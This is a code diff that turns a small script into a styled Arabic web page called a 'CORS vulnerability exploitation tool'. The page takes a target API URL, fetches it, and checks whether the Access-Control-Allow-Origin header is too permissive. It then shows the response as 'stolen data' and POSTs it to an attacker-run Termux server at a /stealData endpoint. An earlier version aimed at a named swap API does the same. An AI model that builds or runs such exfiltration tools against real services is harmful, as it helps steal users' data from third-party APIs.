@@ -1,26 +1,166 @@
-<script>
-    function exploitCORS() {
-        const targetUrl = "https://swap-api.zetrix.com/some/endpoint"; // رابط الـ API المستهدف
-        fetch(targetUrl, {
-            method: "GET",
-            headers: {
-                'X-Custom-Header': 'SomeValue'
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استغلال ثغرة CORS</title>
+    <style>
+        /* تنسيق الصفحة */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            padding: 30px;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+        }
+
+        .form-container {
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 80%;
+            padding: 10px;
+            font-size: 16px;
+            margin-right: 10px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+
+        .status {
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            display: none;
+        }
+
+        .result pre {
+            word-wrap: break-word;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>أداة استغلال ثغرة CORS</h1>
+        <div class="form-container">
+            <input type="text" id="targetUrl" placeholder="أدخل رابط الـ API المستهدف" />
+            <button onclick="exploitCORS()">استغلال الثغرة</button>
+        </div>
+        <div id="status" class="status"></div>
+        <div id="result" class="result"></div>
+    </div>
+
+    <script>
+        // دالة استغلال ثغرة CORS
+        function exploitCORS() {
+            const targetUrl = document.getElementById('targetUrl').value.trim(); // الحصول على الرابط المدخل
+            const statusElement = document.getElementById('status');
+            const resultElement = document.getElementById('result');
+
+            // التحقق من صحة الرابط المدخل
+            if (!targetUrl) {
+                statusElement.textContent = "يرجى إدخال رابط الـ API.";
+                statusElement.style.color = 'red';
+                return;
             }
-        })
-        .then(response => response.text())
-        .then(data => {
-            // إرسال البيانات المسروقة إلى الخادم الذي يعمل على Termux
-            console.log("Data received:", data);
-            fetch('http://10.2.0.2:3000/stealData', { // استبدل <YOUR_TERMUX_IP> بعنوان جهازك
-                method: 'POST',
+
+            // عرض حالة التحميل
+            statusElement.textContent = "جاري فحص الثغرة...";
+            statusElement.style.color = 'blue';
+
+            // إجراء الطلب
+            fetch(targetUrl, {
+                method: "GET",
                 headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ stolenData: data })
+                    'X-Custom-Header': 'SomeValue'
+                }
+            })
+            .then(response => {
+                const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
+
+                // التحقق من CORS misconfiguration
+                if (allowOrigin === '*' || allowOrigin.includes(window.location.origin)) {
+                    console.log("CORS misconfiguration detected");
+                    statusElement.textContent = "تم اكتشاف ثغرة CORS!";
+                    statusElement.style.color = 'green';
+                    return response.text();
+                } else {
+                    console.log("No CORS misconfiguration found");
+                    statusElement.textContent = "لم يتم العثور على ثغرة CORS.";
+                    statusElement.style.color = 'red';
+                    throw new Error("CORS misconfiguration not found");
+                }
+            })
+            .then(data => {
+                // عرض البيانات المسروقة
+                resultElement.style.display = 'block';
+                resultElement.innerHTML = `
+                    <h3>البيانات المسروقة:</h3>
+                    <pre>${data}</pre>
+                `;
+
+                // إرسال البيانات إلى الخادم عبر Termux
+                fetch('http://10.2.0.2:3000/stealData', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ stolenData: data })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log("Data sent successfully", result);
+                })
+                .catch(error => {
+                    console.error("Error sending stolen data:", error);
+                });
+            })
+            .catch(error => {
+                console.error('Error:', error);
             });
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-    }
-</script>
+        }
+    </script>
+</body>
+</html>
